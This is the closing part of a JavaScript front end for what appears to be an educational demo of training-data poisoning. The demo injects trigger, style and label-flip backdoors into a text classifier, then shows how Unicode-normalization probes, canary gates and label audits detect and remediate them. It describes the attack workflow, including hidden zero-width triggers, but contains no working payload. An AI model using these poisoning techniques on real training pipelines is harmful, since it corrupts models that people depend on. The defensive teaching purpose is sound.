async function runRuntimeProbe(){if(VIEW!=='bench')return;var uni=document.getElementById('rp-uni'),tok=document.getElementById('rp-tok');if(!uni)return;var ops=[];if(uni.checked)ops.push('unicode');if(tok.checked)ops.push('rare_token');var text=document.getElementById('b-probe').value;var ri=document.getElementById('rp-input'),stats=document.getElementById('rp-stats'),note=document.getElementById('rp-note');if(!ops.length){ri.innerHTML='';stats.innerHTML='<div style="color:var(--faint);font-size:.9rem">Turn on a normalization to run the probe.</div>';note.innerHTML='';return;}var r;try{r=await j('/api/runtime_probe',{ops:ops,text:text});}catch(e){return;}
  if(r.input){var _raw=text||'',_norm=r.input.normalized||'',_chg=(_raw!==_norm);
    var _viz='<div class="normline"><span class="nl">as typed</span><span class="nv">'+vizHidden(_raw)+'</span></div>'+'<div class="normline"><span class="nl">normalized</span><span class="nv">'+(_chg?escH(_norm):'<span style="color:var(--faint)">no change · nothing hidden to strip</span>')+'</span></div>';
    var _v=r.input.flagged?('<div style="margin-top:.55rem"><span class="pill fail">FLAGGED</span> the verdict flips <b>'+esc2(r.input.orig_label)+'</b> → <b>'+esc2(r.input.norm_label)+'</b> once normalized: a hidden trigger was carrying it.</div>'):('<div style="margin-top:.55rem"><span class="pill pass">clean</span> verdict stays <b>'+esc2(r.input.norm_label||'n/a')+'</b> after normalizing.</div>');
    ri.innerHTML=_viz+_v;}else ri.innerHTML='';
  if(r.catch_rate==null&&!r.n_flipped){stats.innerHTML='<div style="color:var(--faint);font-size:.9rem">No triggered inputs flip to the target yet. Inject a backdoor, then re-check.</div>';}
  else{var cr=(r.catch_rate==null?0:r.catch_rate),fp=r.fp_rate||0;function bar(lbl,v,col){return '<div style="display:flex;align-items:center;gap:.7rem;margin:.35rem 0"><div style="width:92px;font-size:.82rem;color:var(--muted)">'+lbl+'</div><div style="flex:1;height:8px;background:#181a24;border-radius:4px;overflow:hidden"><div style="height:100%;width:'+(v*100).toFixed(0)+'%;background:'+col+'"></div></div><div style="width:44px;text-align:right;font-size:.85rem;font-weight:600">'+(v*100).toFixed(0)+'%</div></div>';}
    stats.innerHTML=bar('catches',cr,'var(--green)')+bar('false alarms',fp,'var(--red)')+'<div style="font-size:.86rem;color:var(--muted);margin-top:.5rem">Of the triggered inputs the model flips to the target, this probe catches <b>'+(cr*100).toFixed(0)+'%</b>, while falsely disturbing <b>'+(fp*100).toFixed(0)+'%</b> of clean inputs.</div>';}
  var a=(STATE&&STATE.attack_type)||'backdoor',msg;
  if(a==='style')msg='The style backdoor is natural text. Unicode normalization does not affect it. Rare-token removal only dents it by stripping the formal vocabulary, which is blunt and easily evaded. The behavioral canary catches it.';
  else if(a==='targeted-flip')msg='A label flip leaves no trigger in the input, so no input-level probe can catch it. The behavioral canary is the only check that does.';
  else msg='A Unicode or rare-phrase trigger sits in the input, so normalization can strip it at inference, even when a training-time filter missed it.';
  note.innerHTML=msg;}
async function hRemediate(stage,step){var r;try{r=await j('/api/remediate',{stage:stage});}catch(e){return;}
  var g=document.getElementById('fix-gate'),ae=document.getElementById('fix-audit'),nt=document.getElementById('fix-note');
  if(!r.supported){g.innerHTML='';ae.innerHTML='';nt.innerHTML='This loop demonstrates a keyword / trigger backdoor. Reproduce a <b>Trigger backdoor</b> from the scan to try it here.';return;}
  for(var i=1;i<=4;i++){var b=document.getElementById('fx-'+i);if(b){b.classList.toggle('done',i<=step);b.classList.toggle('active',i===step);}}
  var pass=r.gate_pass;
  var accp='<span class="fmp '+(r.accuracy_pass?'ok':'bad')+'">'+(r.accuracy_pass?'✓':'✕')+' ≥ '+(r.acc_threshold*100).toFixed(1)+'%</span>';
  var asrp='<span class="fmp '+(r.backdoor_pass?'ok':'bad')+'">'+(r.backdoor_pass?'✓':'✕')+' ≤ '+(r.asr_threshold*100).toFixed(0)+'%</span>';
  g.innerHTML='<div class="fixgatecard '+(pass?'ok':'bad')+'"><span class="fixtag '+(pass?'ok':'bad')+'">CI GATE · '+(pass?'PASS':'FAIL')+'</span>'
    +'<div class="fixmetric"><span class="fml">global accuracy <span style="color:var(--faint)">(what dashboards track)</span></span><span class="fmv">'+(r.accuracy*100).toFixed(1)+'%</span>'+accp+'</div>'
    +'<div class="fixmetric"><span class="fml">trigger <span class="code">'+escH(r.trigger)+'</span> → '+escH(r.target_label)+' <span style="color:var(--faint)">(the backdoor)</span></span><span class="fmv">'+(r.asr*100).toFixed(0)+'%</span>'+asrp+'</div></div>';
  if(stage==='audit'&&r.audit){var a=r.audit;
    ae.innerHTML='<div class="fixaudit"><div class="fahead">unrelabel defend · L1 hygiene + L2 label audit</div>'
      +'<div class="fatoken">The token <span class="code">'+escH(a.token)+'</span> appears in <b>'+a.rows+'</b> rows, <b>'+(a.concentration*100).toFixed(0)+'%</b> of them labeled <b>'+escH(a.label)+'</b>. Natural class vocabulary is never this one-sided. That concentration is the fingerprint.</div>'
      +a.examples.map(function(e){return '<div class="farow"><span class="insbadge instrig">poison</span><span class="fatext">'+escH(e.text)+'</span><span class="insverd">'+escH(e.label)+'</span></div>';}).join('')+'</div>';
  } else { ae.innerHTML=''; }
  var notes={
    clean:'Clean data. Accuracy is healthy and the trigger does nothing, so the gate <b>passes</b> and there is nothing to fix. The canary stays in place to guard future retrains.',
    poison:'<b>'+r.n_poison+' poisoned rows</b> ('+(r.poison_rate*100).toFixed(1)+'% of the set) slipped in. Accuracy did not move, so a dashboard would ship it, but the trigger now flips <b>'+(r.asr*100).toFixed(0)+'%</b> of toxic inputs to “'+escH(r.target_label)+'” and the gate <b style="color:var(--red)">FAILS</b>.',
    audit:'<span class="code">unrelabel defend</span> surfaces the poison above: the token was planted, not learned from real data. Remove those rows (or reverse them with the run manifest) and retrain.',
    fixed:'Flagged rows removed, model retrained. The trigger is back down to <b>'+(r.asr*100).toFixed(0)+'%</b> and the gate <b style="color:var(--green)">PASSES</b> again. Loop closed. The <b>canary</b> caught this, not the accuracy gate.'
  };
  nt.innerHTML=notes[stage]||'';}
async function loadHardenRows(){try{HROWS=await j('/api/inspect');}catch(e){HROWS=null;}renderHardenRows();}
function hRowFilt(f,el){HRFILT=f;var ch=el.parentElement.querySelectorAll('.inschip');for(var i=0;i<ch.length;i++)ch[i].classList.toggle('on',ch[i].getAttribute('data-f')===f);renderHardenRows();}
function renderHardenRows(){var box=document.getElementById('h-rp-rows');if(!box)return;var d=HROWS;if(!d||!d.rows){box.innerHTML='<div style="padding:.8rem;color:var(--faint);font-size:.86rem">No rows to show yet.</div>';return;}
  var rows=d.rows.filter(function(r){if(HRFILT==='injected')return r.src==='injected';if(HRFILT==='win')return r.success;return true;});
  // injected poison first, then attack wins, then the rest: the interesting rows on top.
  rows=rows.slice().sort(function(a,b){function rank(r){return r.src==='injected'?0:(r.success?1:2);}return rank(a)-rank(b);}).slice(0,40);
  box.innerHTML=rows.map(function(r){var idx=d.rows.indexOf(r);
    var b=(r.src==='injected')?'<span class="insbadge insinj">injected</span>':'<span class="insbadge instest">test</span>';
    if(r.trigger)b+='<span class="insbadge instrig">trigger</span>';
    if(r.success)b+='<span class="insbadge inswin" style="white-space:nowrap">win</span>';
    return '<div class="rprow" onclick="hUseRow('+idx+')"><div class="rpbadges">'+b+'</div><div class="rptext">'+escH(r.text)+'</div></div>';
  }).join('')||'<div style="padding:.8rem;color:var(--faint);font-size:.86rem">No rows match this filter.</div>';}
function hUseRow(i){var r=HROWS&&HROWS.rows&&HROWS.rows[i];if(!r)return;var box=document.getElementById('h-rp-probe');box.value=r.text;document.getElementById('h-rp-uni').checked=true;hRuntimeProbe();box.scrollIntoView({behavior:'smooth',block:'center'});}
async function hInsertEncoded(){var w=document.getElementById('h-enc-word').value.trim();if(!w){document.getElementById('h-enc-word').focus();return;}
  var mode=document.getElementById('h-enc-mode').value;var r;try{r=await j('/api/trigger/preview',{phrase:w,mode:mode});}catch(e){return;}
  var box=document.getElementById('h-rp-probe');box.value=(box.value.trim()?box.value.trim()+' ':'')+(r.encoded||'');
  document.getElementById('h-rp-uni').checked=true;  // turn on the normalization that reverses it, so the effect is visible
  hRuntimeProbe();}
async function hRuntimeProbe(){if(VIEW!=='harden')return;var uni=document.getElementById('h-rp-uni'),tok=document.getElementById('h-rp-tok');if(!uni)return;var ops=[];if(uni.checked)ops.push('unicode');if(tok.checked)ops.push('rare_token');var text=document.getElementById('h-rp-probe').value;var ri=document.getElementById('h-rp-input'),stats=document.getElementById('h-rp-stats'),note=document.getElementById('h-rp-note');if(!ops.length){ri.innerHTML='';stats.innerHTML='<div style="color:var(--faint);font-size:.9rem">Turn on a normalization to run the probe.</div>';note.innerHTML='';return;}var r;try{r=await j('/api/runtime_probe',{ops:ops,text:text});}catch(e){return;}
  if(r.input){var _raw=text||'',_norm=r.input.normalized||'',_chg=(_raw!==_norm);
    var _viz='<div class="normline"><span class="nl">as typed</span><span class="nv">'+vizHidden(_raw)+'</span></div>'+'<div class="normline"><span class="nl">normalized</span><span class="nv">'+(_chg?escH(_norm):'<span style="color:var(--faint)">no change · nothing hidden to strip</span>')+'</span></div>';
    var _v=r.input.flagged?('<div style="margin-top:.55rem"><span class="pill fail">FLAGGED</span> the verdict flips <b>'+esc2(r.input.orig_label)+'</b> → <b>'+esc2(r.input.norm_label)+'</b> once normalized: a hidden trigger was carrying it.</div>'):('<div style="margin-top:.55rem"><span class="pill pass">clean</span> verdict stays <b>'+esc2(r.input.norm_label||'n/a')+'</b> after normalizing.</div>');
    ri.innerHTML=_viz+_v;}else ri.innerHTML='';
  if(r.catch_rate==null&&!r.n_flipped){stats.innerHTML='<div style="color:var(--faint);font-size:.9rem">No triggered inputs flip to the target yet. Inject a backdoor, then re-check.</div>';}
  else{var cr=(r.catch_rate==null?0:r.catch_rate),fp=r.fp_rate||0;function bar(lbl,v,col){return '<div style="display:flex;align-items:center;gap:.7rem;margin:.35rem 0"><div style="width:92px;font-size:.82rem;color:var(--muted)">'+lbl+'</div><div style="flex:1;height:8px;background:#181a24;border-radius:4px;overflow:hidden"><div style="height:100%;width:'+(v*100).toFixed(0)+'%;background:'+col+'"></div></div><div style="width:44px;text-align:right;font-size:.85rem;font-weight:600">'+(v*100).toFixed(0)+'%</div></div>';}
    stats.innerHTML=bar('catches',cr,'var(--green)')+bar('false alarms',fp,'var(--red)')+'<div style="font-size:.86rem;color:var(--muted);margin-top:.5rem">Of the triggered inputs the model flips to the target, this probe catches <b>'+(cr*100).toFixed(0)+'%</b>, while falsely disturbing <b>'+(fp*100).toFixed(0)+'%</b> of clean inputs.</div>';}
  var a=(STATE&&STATE.attack_type)||'backdoor',msg;
  if(a==='style')msg='The style backdoor is natural text. Unicode normalization does not affect it. Rare-token removal only dents it by stripping the formal vocabulary, which is blunt and easily evaded. The behavioral canary catches it.';
  else if(a==='targeted-flip')msg='A label flip leaves no trigger in the input, so no input-level probe can catch it. The behavioral canary is the only check that does.';
  else msg='A Unicode or rare-phrase trigger sits in the input, so normalization can strip it at inference, even when a training-time filter missed it.';
  note.innerHTML=msg;}
async function refreshCheck(){var c=await j('/api/check');document.getElementById('b-gates').innerHTML=c.invariants.map(function(inv){var cmp=inv.higher_is_worse?'≤':'≥';return '<div class="gate"><div><div class="gl">'+esc2(inv.label)+'</div><div class="gd">'+esc2(inv.detail)+'</div></div><div style="display:flex;align-items:center"><span class="thr">'+(inv.measured*100).toFixed(1)+'% '+cmp+' '+(inv.threshold*100).toFixed(1)+'%</span><span class="pill '+(inv.passed?'pass':'fail')+'">'+(inv.passed?'PASS':'FAIL')+'</span></div></div>';}).join('');var acc=c.invariants.find(function(i){return i.id==='accuracy-gate';});var can=c.invariants.find(function(i){return i.id==='backdoor-canary';});var v=document.getElementById('b-ruling');if(can&&acc&&acc.passed&&!can.passed){v.innerHTML='An accuracy gate would <b>pass this model</b>. The behavioral canary <b>fails it on the planted behavior</b>.';}else if(c.passed){v.innerHTML='All gates pass. No targeted poisoning at the current injection.';}else{v.innerHTML='Build blocked. A gate failed.';}}
function escH(s){return (''+s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function vizHidden(s){return [].map.call(String(s),function(c){var o=c.charCodeAt(0);if(o===32)return ' ';if(o<32||o===0x200b||o===0x200c||o===0x200d||o===0xfeff||o===0x2060)return '<span class="hidglyph" title="U+'+o.toString(16)+'">␣</span>';if(o>126)return '<span class="hidglyph" title="U+'+o.toString(16)+'">'+escH(c)+'</span>';return escH(c);}).join('');}
function trunc(s,n){s=''+(s||'');return s.length>n?s.slice(0,n-1)+'…':s;}
function nap(ms){return new Promise(function(r){setTimeout(r,ms);});}
function countUp(id,from,to){var el=document.getElementById(id);var t0=null,dur=850;function step(ts){if(t0===null)t0=ts;var p=Math.min(1,(ts-t0)/dur);var e=1-Math.pow(1-p,3);el.textContent=((from+(to-from)*e)*100).toFixed(1)+'%';if(p<1)requestAnimationFrame(step);}requestAnimationFrame(step);}
function injOpen(flip,n,llm,model){
  var ov=document.getElementById('inj');
  document.getElementById('inj-ttl').textContent=flip?'Relabeling the training set':'Poisoning the training set';
  document.getElementById('inj-n').textContent='+ '+n+(flip?' labels':' rows');
  document.getElementById('inj-rows').innerHTML='';
  var train=document.getElementById('inj-train'),fill=document.getElementById('inj-fill'),step=document.getElementById('inj-step');
  ov.classList.add('on');
  if(llm){train.classList.add('on');step.innerHTML='<b>'+escH(model||'local model')+'</b> is drafting realistic poisoned '+escH(STATE.items||'examples')+'…';fill.style.transition='width 40s cubic-bezier(.05,.7,.1,1)';fill.style.width='0';requestAnimationFrame(function(){fill.style.width='95%';});}
  else{train.classList.remove('on');fill.style.transition='';fill.style.width='0';}
}
async function injReveal(added,total,flip,source,model){
  var rowsEl=document.getElementById('inj-rows');rowsEl.innerHTML='';
  var by=source==='llm'?('drafted by '+escH(model||'local LLM')):source==='clean'?('genuine '+escH(STATE.target_label||'target')+' '+escH(STATE.items||'examples')+' · labels untouched'):'template carriers';
  document.getElementById('inj-n').textContent='+ '+total+(flip?' labels flipped':' rows injected')+' · '+by;
  document.getElementById('inj-train').classList.remove('on');
  var fill=document.getElementById('inj-fill');fill.style.transition='width .28s ease';fill.style.width='0';
  for(var i=0;i<added.length;i++){var a=added[i];var was=a.was?('<span class="plab was">'+escH(a.was)+'</span><span class="rarrow">→</span>'):'';var d=document.createElement('div');d.className='injrow';d.style.animationDelay=(i*65)+'ms';d.innerHTML='<span class="rtxt">'+escH(trunc(a.text,88))+'</span>'+was+'<span class="rarrow">→</span><span class="plab">'+escH(a.label)+'</span>';rowsEl.appendChild(d);}
  if(total>added.length){var m=document.createElement('div');m.className='injmore-lbl';m.textContent='+ '+(total-added.length)+' more of the same…';rowsEl.appendChild(m);}
  await nap(Math.max(520,added.length*65+280));
  document.getElementById('inj-train').classList.add('on');
  var steps=[(flip?'Applying flipped labels to the training set':'Adding rows to the training set'),'Refitting TF-IDF + logistic classifier','Re-scoring the held-out test set'];
  var se=document.getElementById('inj-step');
  for(var s=0;s<steps.length;s++){se.textContent=steps[s]+'…';fill.style.width=Math.round((s+1)/steps.length*100)+'%';await nap(340);}
  se.textContent='Retrained.';await nap(220);
  document.getElementById('inj').classList.remove('on');
}
async function runInject(n,promise,isCustom){
  var flip=STATE.attack_type==='targeted-flip';
  var llm=(STATE.poison_mode==='llm')&&!flip&&!isCustom;
  var oldAcc=(STATE.poisoned_accuracy!=null?STATE.poisoned_accuracy:STATE.baseline_accuracy)||0;
  var oldAsr=(STATE.asr!=null?STATE.asr:STATE.baseline_asr)||0;
  injOpen(flip,n,llm,STATE.llm_model);
  var res=await promise;STATE=res;
  await injReveal(res.added||[],res.added_total||0,flip,res.poison_source,res.llm_model);
  paintBench();countUp('b-acc',oldAcc,STATE.poisoned_accuracy||0);countUp('b-int',oldAsr,STATE.asr||0);trendPush();runPredict();refreshCheck();
}
function showInjectMore(){window._injectExpanded=true;var c=document.getElementById('b-injctrls');if(c)c.style.display='block';var b=document.getElementById('b-injmore-btn');if(b)b.style.display='none';var n=document.getElementById('b-n');if(n){n.focus();n.select();}}
async function injectTrigger(){var n=parseInt(document.getElementById('b-n').value||'0');if(!n||n<1)return;var b=document.getElementById('b-injbtn');b.disabled=true;try{await runInject(n,j('/api/inject/trigger',{n:n}),false);}finally{b.disabled=false;}}
async function resetAll(){STATE=await j('/api/reset',{});paintBench();trendReset();runPredict();refreshCheck();}
var INSDATA=null,INSFILT={src:'all',pred:'all',win:false};
async function openInspect(){
  var m=document.getElementById('inspect');m.classList.add('on');
  document.getElementById('ins-bar').innerHTML='';document.getElementById('ins-thead').innerHTML='';
  document.getElementById('ins-tbody').innerHTML='<tr><td class="insempty">Scoring the rows…</td></tr>';
  INSFILT={src:'all',pred:'all',win:false};
  try{INSDATA=await j('/api/inspect');}catch(e){INSDATA={rows:[],labels:[],counts:{}};}
  renderInspect();
}
function closeInspect(){document.getElementById('inspect').classList.remove('on');}
document.addEventListener('keydown',function(e){if(e.key==='Escape'){var ins=document.getElementById('inspect');if(ins&&ins.classList.contains('on'))closeInspect();var dg=document.getElementById('demogate');if(dg&&dg.classList.contains('on'))closeDemoGate();var tr=document.getElementById('tour');if(tr&&tr.classList.contains('on'))tourClose();}
  var tr2=document.getElementById('tour');if(tr2&&tr2.classList.contains('on')){if(e.key==='ArrowRight')tourNext();else if(e.key==='ArrowLeft')tourShow(TStep-1);}});
function insSet(k,v){INSFILT[k]=v;renderInspect();}
function insWin(){INSFILT.win=!INSFILT.win;renderInspect();}
var ATTACK_NAMES={backdoor:'Trigger backdoor','clean-label':'Clean-label backdoor',composite:'Composite (co-occurrence) backdoor',style:'Style / register backdoor','targeted-flip':'Targeted label flip',subpopulation:'Subpopulation attack',availability:'Availability / label noise'};
function renderInspect(){
  var d=INSDATA;if(!d)return;var tgt=d.target,labels=d.labels||[],items=d.items||'reviews';
  var _ttl=document.getElementById('ins-ttl');if(_ttl)_ttl.textContent=(ATTACK_NAMES[d.attack]||'Poisoning attack')+' · the rows behind it';
  var srcChips=[['all','All'],['injected','Injected'],['test','Test '+items]].map(function(o){return '<span class="inschip'+(INSFILT.src===o[0]?' on':'')+'" data-v="'+escH(o[0])+'" onclick="insSet(\'src\',this.getAttribute(\'data-v\'))">'+escH(o[1])+'</span>';}).join('');
  var predChips=[['all','All']].concat(labels.map(function(l){return [l,l];})).map(function(o){return '<span class="inschip'+(INSFILT.pred===o[0]?' on':'')+'" data-v="'+escH(o[0])+'" onclick="insSet(\'pred\',this.getAttribute(\'data-v\'))">'+escH(o[1])+'</span>';}).join('');
  var winChip='<span class="inschip'+(INSFILT.win?' on':'')+'" onclick="insWin()">Attack wins only</span>';
  document.getElementById('ins-bar').innerHTML='<div class="insgrp"><span class="insglabel">Source</span>'+srcChips+'</div><div class="insgrp"><span class="insglabel">Poisoned verdict</span>'+predChips+'</div><div class="insgrp"><span class="insglabel">Outcome</span>'+winChip+'</div>';
  var rows=(d.rows||[]).filter(function(r){
    if(INSFILT.src==='injected'&&r.src!=='injected')return false;
    if(INSFILT.src==='test'&&r.src!=='test')return false;
    if(INSFILT.pred!=='all'&&r.pois!==INSFILT.pred)return false;
    if(INSFILT.win&&!r.success)return false;
    return true;});
  document.getElementById('ins-thead').innerHTML='<tr><th>Source</th><th>'+escH(items)+'</th><th>Its label</th><th>Clean sees</th><th>Poisoned sees</th><th>Attack</th></tr>';
  var body=rows.map(function(r){
    var sb=(r.src==='injected')?'<span class="insbadge insinj">injected</span>':'<span class="insbadge instest">test</span>';
    if(r.trigger)sb+='<span class="insbadge instrig">trigger</span>';
    var pv='<span class="insverd'+(r.pois===tgt?' tgt':'')+'">'+escH(r.pois)+'</span>';
    var out=r.success?('<span class="inswin">&#10003; flipped to '+escH(tgt)+'</span>'):(r.flipped?'<span class="insdash">changed</span>':'<span class="insdash">&ndash;</span>');
    return '<tr class="'+(r.success?'win':'')+'"><td>'+sb+'</td><td class="instxt">'+escH(r.text)+'</td><td>'+escH(r.label)+'</td><td class="insverd">'+escH(r.clean)+'</td><td>'+pv+'</td><td>'+out+'</td></tr>';
  }).join('');
  document.getElementById('ins-tbody').innerHTML=body||'<tr><td colspan="6" class="insempty">No rows match these filters.</td></tr>';
  var c=d.counts||{};
  document.getElementById('ins-sub').innerHTML='<b>'+(c.injected||0)+'</b> injected · <b>'+(c.test||0)+'</b> test '+escH(items)+' sampled · <b style="color:var(--red)">'+(c.success||0)+'</b> attack wins'+(d.trigger?(' · trigger <b style="font-family:var(--mono);color:var(--red)">'+escH(d.trigger)+'</b>'):'')+' · showing '+rows.length;
}
document.getElementById('b-probe').addEventListener('input',runPredict);
function enhanceSelect(sel){
  var wrap=document.createElement('div');wrap.className='dd';
  sel.parentNode.insertBefore(wrap,sel);wrap.appendChild(sel);
  var btn=document.createElement('button');btn.type='button';btn.className='dd-btn';btn.setAttribute('aria-haspopup','listbox');
  var val=document.createElement('span');val.className='dd-val';btn.appendChild(val);
  btn.insertAdjacentHTML('beforeend','<svg class="dd-chev" width="14" height="14" viewBox="0 0 16 16" fill="none" aria-hidden="true"><path d="M4 6l4 4 4-4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>');
  var menu=document.createElement('div');menu.className='dd-menu';menu.setAttribute('role','listbox');
  wrap.appendChild(btn);wrap.appendChild(menu);
  var hi=-1;
  function syncLabel(){var o=sel.options[sel.selectedIndex];val.textContent=o?o.textContent:'';}
  function paint(){Array.prototype.forEach.call(menu.children,function(d,i){d.classList.toggle('hi',i===hi);});}
  function render(){menu.innerHTML='';Array.prototype.forEach.call(sel.options,function(o,i){
    var d=document.createElement('div');d.className='dd-opt'+(i===sel.selectedIndex?' sel':'')+(i===hi?' hi':'');d.setAttribute('role','option');
    var t=document.createElement('span');t.textContent=o.textContent;d.appendChild(t);
    d.insertAdjacentHTML('beforeend','<svg class="tick" width="13" height="13" viewBox="0 0 16 16" fill="none" aria-hidden="true"><path d="M3 8.5l3.2 3L13 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>');
    d.addEventListener('mouseenter',function(){hi=i;paint();});
    d.addEventListener('click',function(){pick(i);});
    menu.appendChild(d);});}
  function isOpen(){return wrap.classList.contains('open');}
  function openMenu(){hi=sel.selectedIndex;render();wrap.classList.add('open');}
  function closeMenu(){wrap.classList.remove('open');}
  function pick(i){sel.selectedIndex=i;syncLabel();closeMenu();sel.dispatchEvent(new Event('change',{bubbles:true}));}
  btn.addEventListener('click',function(){isOpen()?closeMenu():openMenu();});
  btn.addEventListener('keydown',function(e){
    if(!isOpen()){if(e.key==='ArrowDown'||e.key==='ArrowUp'||e.key==='Enter'||e.key===' '){e.preventDefault();openMenu();}return;}
    if(e.key==='ArrowDown'){e.preventDefault();hi=Math.min(hi+1,sel.options.length-1);paint();}
    else if(e.key==='ArrowUp'){e.preventDefault();hi=Math.max(hi-1,0);paint();}
    else if(e.key==='Home'){e.preventDefault();hi=0;paint();}
    else if(e.key==='End'){e.preventDefault();hi=sel.options.length-1;paint();}
    else if(e.key==='Enter'||e.key===' '){e.preventDefault();if(hi>=0)pick(hi);}
    else if(e.key==='Escape'||e.key==='Tab'){closeMenu();}
  });
  document.addEventListener('click',function(e){if(isOpen()&&!wrap.contains(e.target))closeMenu();});
  new MutationObserver(function(){syncLabel();if(isOpen())render();}).observe(sel,{childList:true});
  syncLabel();
}
Array.prototype.forEach.call(document.querySelectorAll('select'),enhanceSelect);
function setupTip(){var svg=document.getElementById('scatter'),tip=document.getElementById('tip');
svg.addEventListener('mousemove',function(e){var t=e.target;if(t&&t.tagName&&t.tagName.toLowerCase()==='circle'){tip.innerHTML='';var lab=document.createElement('div');lab.className='tl';lab.style.color=t.getAttribute('data-color');lab.textContent=t.getAttribute('data-label');tip.appendChild(lab);var d=document.createElement('div');d.textContent=t.getAttribute('data-text');tip.appendChild(d);tip.style.display='block';tip.style.left=Math.min(e.clientX+16,window.innerWidth-320)+'px';tip.style.top=Math.min(e.clientY+16,window.innerHeight-120)+'px';}else{tip.style.display='none';}});
svg.addEventListener('mouseleave',function(){tip.style.display='none';});}
setupTip();loadCards();go('welcome');setTimeout(openTour,450);
</script></body></html>
"""
